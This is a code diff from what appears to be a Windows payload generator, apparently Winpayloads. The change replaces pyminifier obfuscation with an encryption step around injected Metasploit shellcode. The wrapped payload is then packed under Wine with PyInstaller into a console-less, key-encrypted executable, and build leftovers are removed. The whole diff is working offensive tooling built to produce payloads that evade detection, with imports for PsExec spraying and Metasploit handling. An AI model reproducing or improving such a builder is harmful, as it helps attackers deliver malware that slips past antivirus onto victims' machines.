@@ -4,7 +4,7 @@ from psexecspray import *
 from startmetasploit import *
 from generatepayload import *
 from menu import *
-import pyminifier
+from encrypt import *
 
 payloaddir = '/etc/winpayloads'
 
@@ -57,18 +57,14 @@ def askAndReturnModules(shellcode, metasploit_type):
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
-    with open('%s/payload.py' % payloaddir, 'w+') as Filesave, \
-         open('%s/payloadob.py' % payloaddir, 'w+') as Filesave2:
-        Filesave.write(SHELLCODE.injectwindows % (ez2read_shellcode))
+    with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
+        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
         Filesave.close()
-        obfuscatedpayload = subprocess.check_output(['pyminifier', '--obfuscate', '%s/payload.py' %(payloaddir)])
-        Filesave2.write(obfuscatedpayload)
-        Filesave2.close()
     print '[*] Creating Payload using Pyinstaller...'
 
     randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))
     p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
-                          '%s/payloadob.py' % payloaddir, '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                          '%s/payload.py' % payloaddir, '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
     while p.poll() == None:
         LOADING.Update()
@@ -81,8 +77,7 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
         print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
         sys.stdout.write(payloadstderr)
         raise KeyboardInterrupt
-    print payloadstderr
-    os.system('mv dist/payloadob.exe %s/%s.exe'% (payloaddir,payloadname))
+    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir,payloadname))
     print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
     CleanUpPayloadMess(payloadname)
     DoPayloadUpload(payloadname)
@@ -93,7 +88,6 @@ def CleanUpPayloadMess(payloadname):
     os.system('rm build -r')
     os.system('rm *.spec')
     os.system('rm %s/payload.py' % payloaddir)
-    os.system('rm %s/payloadob.py' % payloaddir)
 
 def DoPayloadUpload(payloadname):
     want_to_upload = raw_input(
